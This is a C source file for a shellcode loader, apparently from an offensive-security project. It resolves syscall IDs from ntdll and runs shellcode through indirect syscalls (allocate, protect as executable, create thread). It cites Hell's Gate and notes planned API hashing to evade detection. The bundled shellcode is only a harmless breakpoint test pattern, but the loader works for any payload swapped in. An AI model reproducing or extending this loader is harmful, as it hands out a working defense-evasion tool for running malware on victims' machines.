#include <Windows.h>
#include <stdio.h>

#include "ShellCodeLoader.h"
#include "WinApiReImplementations.h"

#pragma comment(linker, "/section:.data,RW")//.data section writable
//#pragma comment(linker, "/section:.data,RWE")//.data section executable

/*
* Define the functisons from Syscalls.asm.
* These definitions make the PrepareSyscall and DoIndirectSyscall functions accessible to ShellcodeLoader.c. 
*/ 

// we pass a DWORD instead of a word (some syscall IDs are 3 Bytes long)
//extern VOID PrepareSyscall(WORD wSystemCall);
extern VOID PrepareSyscall(DWORD wSystemCall, LPVOID pSystemCall);
// to use this without implicit return type, we need to convert from c++ to c
// not sure whether passing an implicit return type would actually work here, as differenct syscalls
// may return different return types (?)
extern DoIndirectSyscall();

/*
* Locate syscall information within ntdll
* arg0: base address of ntdll
* arg1: function name to resolve (e.g. NtCreateProcess) -> to be replaced by hash
* arg2: pointer to void*. This will be populated with the address of the syscall instruction for that function
* arg3: pointer to DWORD. This will be populated with the Syscall ID
* return: -1 / ERROR_SUCCESS.
*/
NTSTATUS resolve_syscall(HMODULE hNtDll, LPCSTR funcName, _Out_ LPVOID *outpSyscall, _Out_ LPDWORD outSyscallId) {
    // tbd: Avoid GPA and use API hashes. 
    // See https://www.ired.team/offensive-security/defense-evasion/windows-api-hashing-in-malware for a copy-paste ready implementation of GPA
    LPVOID pProc = (LPVOID)GetProcAddress(hNtDll, funcName);

    if (pProc == NULL) {
        DEBUG_PRINT("GetProcAddress failed for %s\n", funcName);
        return (NTSTATUS) -1;
    }

    DEBUG_PRINT("Function %s at %p\n", funcName, pProc);
    /*
    0:000> uf ntdll!NtCreateProcess
    ntdll!NtCreateProcess:
    00007ffc`b3e10b10 4c8bd1          mov     r10,rcx
    00007ffc`b3e10b13 b8be000000      mov     eax,0BEh
    00007ffc`b3e10b18 f604250803fe7f01 test    byte ptr [SharedUserData+0x308 (00000000`7ffe0308)],1
    00007ffc`b3e10b20 7503            jne     ntdll!NtCreateProcess+0x15 (00007ffc`b3e10b25)  Branch

    ntdll!NtCreateProcess+0x12:
    00007ffc`b3e10b22 0f05            syscall
    00007ffc`b3e10b24 c3              ret
    */

    DWORD syscallId = 0;
    PBYTE ptr = (PBYTE)pProc;
    // 0x0f05 => syscall
    while (TRUE) {
        // 0xb8 => mov eax, ...
        if (*ptr == 0xb8) {
            syscallId = *(DWORD*)(ptr + 1);
        }
        else if (*ptr == 0x0f) {
            if (*(ptr + 1) == 0x05) {
                // 0xc3 => ret
                if (*(ptr + 2) == 0xc3) {
                    DEBUG_PRINT("Syscall for %s at %p. ID: %02x\n", funcName, ptr, syscallId);
                    //return syscallId;
                    *outSyscallId = syscallId;
                    *outpSyscall = ptr;
                    return ERROR_SUCCESS;
                }
            }
        }
        ptr++;
        if ((ptr - (PBYTE)pProc) == 50) {
            DEBUG_PRINT("Could not identify Syscall for %s\n", funcName);
            //break;
            return (NTSTATUS)-1;
        }
    }
}

/*
* populate the SYSCALL_INFO_TABLE by resolving the individual syscall information 
* If you'd like to add more syscalls, change the SYSCALL_INFO_TABLE struct within ShellCodeLoader.h and add calls to resolve_syscall as below
* arg0: Base address of ntdll
* arg1: Pointer to SYSCALL_INFO_TABLE struct - This is populated with the actual syscall information
* return: ERROR_SUCCESS (success) or -1 (failure)
*/

NTSTATUS populate_syscall_table(HMODULE hNtDll, _Out_ PSYSCALL_INFO_TABLE pSyscallTable) {
    LPCSTR funcName = "NtAllocateVirtualMemory";
    NTSTATUS status = (NTSTATUS)-1; 
    status = resolve_syscall(hNtDll, funcName, &pSyscallTable->NtAllocateVirtualMemory.pSyscall, &pSyscallTable->NtAllocateVirtualMemory.syscallId);
    if (status != ERROR_SUCCESS) {
        DEBUG_PRINT("Failed to resolve Syscall for %s!", funcName);
      return (NTSTATUS)-1;
    }

    funcName = "NtProtectVirtualMemory";
    status = resolve_syscall(hNtDll, funcName, &pSyscallTable->NtProtectVirtualMemory.pSyscall, &pSyscallTable->NtProtectVirtualMemory.syscallId);
    if (status != ERROR_SUCCESS) {
        DEBUG_PRINT("Failed to resolve Syscall for %s!", funcName);
        return (NTSTATUS)-1;
    }

    funcName = "NtCreateThreadEx";
    status = resolve_syscall(hNtDll, funcName, &pSyscallTable->NtCreateThreadEx.pSyscall, &pSyscallTable->NtCreateThreadEx.syscallId);
    if (status != ERROR_SUCCESS) {
        DEBUG_PRINT("Failed to resolve Syscall for %s!", funcName);
        return (NTSTATUS)-1;
    }

    funcName = "NtWaitForSingleObject";
    status = resolve_syscall(hNtDll, funcName, &pSyscallTable->NtWaitForSingleObject.pSyscall, &pSyscallTable->NtWaitForSingleObject.syscallId);
    if (status != ERROR_SUCCESS) {
        DEBUG_PRINT("Failed to resolve Syscall for %s!", funcName);
        return (NTSTATUS)-1;
    }

    return ERROR_SUCCESS;

}

/*
* Execute shellcode using indirect syscalls (copied from https://github.com/am0nsec/HellsGate/blob/master/HellsGate/main.c#L166)
* arg0: pointer to syscall table. The syscallId and pSyscall members are used in PrepareSyscall
* arg1: shellcode
* return: ERROR_SUCCESS (success) / -1 (failure)
* Call stack:
*   * NtAllocateVirutalMemory
*   * memcpy (basically)
*   * NtProtectVirtualMemory
*   * NtCreateThreadEx
*   * NtWaitForSingleObject
*/
NTSTATUS execute_shellcode_create_thread(PSYSCALL_INFO_TABLE pSyscallTable, const CHAR shellcode[], size_t shellcode_len) {
    NTSTATUS status = 0x00000000;
    DEBUG_PRINT("Executing shellcode\n");
    
    // Allocate memory for the shellcode
    PVOID lpAddress = NULL;
    SIZE_T sDataSize = shellcode_len;
    PrepareSyscall(pSyscallTable->NtAllocateVirtualMemory.syscallId, pSyscallTable->NtAllocateVirtualMemory.pSyscall);
    status = DoIndirectSyscall((HANDLE)-1, &lpAddress, 0, &sDataSize, MEM_COMMIT, PAGE_READWRITE);
    
    if (status != ERROR_SUCCESS) {
        DEBUG_PRINT("NtAllocateVirtualMemory failed!");
        return (NTSTATUS)-1;
    }

    DEBUG_PRINT("Allocated memory at %p\n", lpAddress);

    // Write shellcodde
    MoveMemoryReImpl(lpAddress, shellcode, shellcode_len);

    // make page executable
    ULONG ulOldProtect = 0;
    PrepareSyscall(pSyscallTable->NtProtectVirtualMemory.syscallId, pSyscallTable->NtProtectVirtualMemory.pSyscall);
    status = DoIndirectSyscall((HANDLE)-1, &lpAddress, &sDataSize, PAGE_EXECUTE_READ, &ulOldProtect);

    if (status != ERROR_SUCCESS) {
        DEBUG_PRINT("NtProtectVrirtualMemory failed!");
        return (NTSTATUS)-1;
    }

    DEBUG_PRINT("NtProtectVrirtualMemory success!\n");

    // Create thread
    HANDLE hHostThread = INVALID_HANDLE_VALUE;
    PrepareSyscall(pSyscallTable->NtCreateThreadEx.syscallId, pSyscallTable->NtCreateThreadEx.pSyscall);
    status = DoIndirectSyscall(&hHostThread, 0x1FFFFF, NULL, (HANDLE)-1, (LPTHREAD_START_ROUTINE)lpAddress, NULL, FALSE, NULL, NULL, NULL, NULL);

    if (status != ERROR_SUCCESS) {
        DEBUG_PRINT("NtCreateThreadEx failed!");
        return (NTSTATUS)-1;
    }

    DEBUG_PRINT("NtCreateThreadEx success. hThread: %p\n", hHostThread);

    // Wait for 1 second & execute
    LARGE_INTEGER Timeout;
    Timeout.QuadPart = -10000000;
    PrepareSyscall(pSyscallTable->NtWaitForSingleObject.syscallId, pSyscallTable->NtWaitForSingleObject.pSyscall);
    status = DoIndirectSyscall(hHostThread, FALSE, &Timeout);

    if (status != ERROR_SUCCESS) {
        DEBUG_PRINT("NtWaitForSingleObject Failed!");
        return (NTSTATUS)-1;
    }

    DEBUG_PRINT("NtWaitForSingleObject success.\n");

    return ERROR_SUCCESS;
}

// Entrypoint
int main()
{
    // todo: resolve ntdll from peb
    HMODULE hNtDll = GetModuleHandle(L"ntdll.dll");
    if (hNtDll == NULL) {
        DEBUG_PRINT("GetModuleHandle failed for ntdll!\n");
        return -1;
    }

    DEBUG_PRINT("NtDll mapped to %p\n", hNtDll);
    // https://devblogs.microsoft.com/oldnewthing/20110921-00/?p=9583
    // introduced MOV EDI, EDI just to make the shellcode more distinguashalble from NOP only
    // \w this shellcode, VisualStudio should throw an error as "A breakpoint instruction (__debugbreak() statement or a similar call) was executed in ShellcodeLoader.exe." when debugging
    // In the Disassembly window, click "View" to check that the shellcode has been copied correctly. It should look similar to the following:
    // 000001C029970000  int         3
    // 000001C029970001  nop
    // 000001C029970002  mov         edi, edi
    // 000001C029970004  nop
    // 000001C029970005  mov         edi, edi
    // 000001C029970007  int         3
    // 000001C029970008  int         3
    // 000001C029970009  int         3
    // 000001C02997000A  int         3
    const CHAR shellcode[] = {
        0xcc,       // INT3
        0x90,       // NOP
        0x8b, 0xff, // MOV EDI, EDI
        0x90,       // NOP
        0x8b, 0xff, // MOV EDI, EDI
        0xcc,       // INT3
        0xcc,       // INT3
        0xcc,       // INT3
        0xcc        // INT3
    };

    DEBUG_PRINT("sizeof shellcode: %d\n", (int)sizeof(shellcode));
    
    SYSCALL_INFO_TABLE syscalls = { 0 };

    NTSTATUS status = populate_syscall_table(hNtDll, &syscalls); 

    if (status != ERROR_SUCCESS) {
        DEBUG_PRINT("Error populating Syscall table!\n");
        return -1;
    }

    status = execute_shellcode_create_thread(&syscalls, shellcode, sizeof(shellcode)); 

    if (status != ERROR_SUCCESS) {
        DEBUG_PRINT("Error executing shellcode!\n");
        return -1;
    }
        
    DEBUG_PRINT("YAY");
    return ERROR_SUCCESS; 
}
